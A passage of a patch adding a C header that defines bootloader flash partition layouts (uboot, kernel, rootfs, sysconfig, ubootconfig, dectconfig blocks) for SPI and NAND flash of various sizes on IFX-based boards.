+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x00FF4FFF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x00FFFFFF
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+
+
+/***************************************************************************/
+/***************************************************************************/
+/***************NAND FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_NAND
+
+#ifdef CONFIG_NAND_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NAND_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NAND_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#elif CONFIG_NAND_FLASH_128M
+#define IFX_CONFIG_FLASH_SIZE 128
+#elif CONFIG_NAND_FLASH_512M
+#define IFX_CONFIG_FLASH_SIZE 512
+#elif  CONFIG_NAND_FLASH_1024M
+#define IFX_CONFIG_FLASH_SIZE 1024
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF  
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+
+ 
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 128)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x002C0000\0"                                      \
+        "part3_begin=0x06C40000\0"                                      \
+        "part4_begin=0x07040000\0"                                      \
+        "part5_begin=0x07080000\0"                                      \
+        "total_part=6\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0x0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x6980000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x06C40000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x400000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0703FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x7040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x0704FFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x40000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x070BFFFF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x07FFFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003FF3FF
+  
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00050000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00050000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+  
+#elif (IFX_CONFIG_FLASH_SIZE == 128)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "part3_begin=0x002C0000\0"                                      \
+        "part4_begin=0x06C40000\0"                                      \
+        "part5_begin=0x07040000\0"                                      \
+        "part6_begin=0x07080000\0"                                      \
+        "total_part=7\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x000C0000
